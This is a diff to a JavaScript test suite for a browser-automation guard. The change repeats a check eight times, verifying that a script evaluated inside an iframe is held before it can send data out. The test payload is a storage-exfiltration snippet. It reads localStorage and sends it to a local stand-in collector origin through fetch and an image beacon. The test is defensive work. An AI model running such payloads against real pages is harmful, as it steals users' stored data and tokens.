@@ -305,10 +305,15 @@ async function main() {
         need(val(inApp) === "Workflows | Harlow Legal", "eval.frame", `chrome_eval with frame b.localhost returned ${short(val(inApp))}, wanted the iframe's own title "Workflows | Harlow Legal" (it ran in the top page?)`);
         const leakTo = `${fixture.site("fresh")}/collect?d=`;
         const before = (await state()).collected.length;
-        const leak = await step("an eval inside the iframe sends localStorage to a fresh origin", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(leakTo)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(leakTo)} + 'img'; return 1; })()` }));
-        need(leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held: ${short(leak)} (the guard covers the top page only)`);
-        await sleep(400);
-        need((await state()).collected.length === before, "eval.frame.guard", `the fresh origin received ${(await state()).collected.length - before} request(s) from the held script`);
+        // The same script is run several times: the guard must hold it EVERY time, and the fresh origin must see nothing EVERY time (a leak on Windows was intermittent).
+        let leak = /** @type {any} */ (null);
+        for (let n = 0; n < 8; n++) {
+          leak = await step("an eval inside the iframe sends localStorage to a fresh origin" + (n ? ` (again ${n})` : ""), () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(leakTo)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(leakTo)} + 'img'; return 1; })()` }));
+          console.log("[frames-suite] EGRESS " + JSON.stringify({ n, held: leak.held, contained: leak.contained, why: String(leak.why || "").slice(0, 160) }));
+          need(leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held (run ${n}): ${short(leak)} (the guard covers the top page only)`);
+          await sleep(300);
+          need((await state()).collected.length === before, "eval.frame.guard", `the fresh origin received ${(await state()).collected.length - before} request(s) from the held script (run ${n}; contained ${leak.contained || "?"})`);
+        }
         const own = await step("the iframe's own API call is not held", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__api('GET', '/api/workflows').then(function (r) { return r.status; })" }));
         need(!own.held && own.ok !== false && val(own) === 200, "eval.frame.guard", `the iframe's own API call was refused or failed: ${short(own)}`);
         return { titleTop: val(inTop), titleFrame: val(inApp), leakHeld: true, ownApiStatus: val(own) };
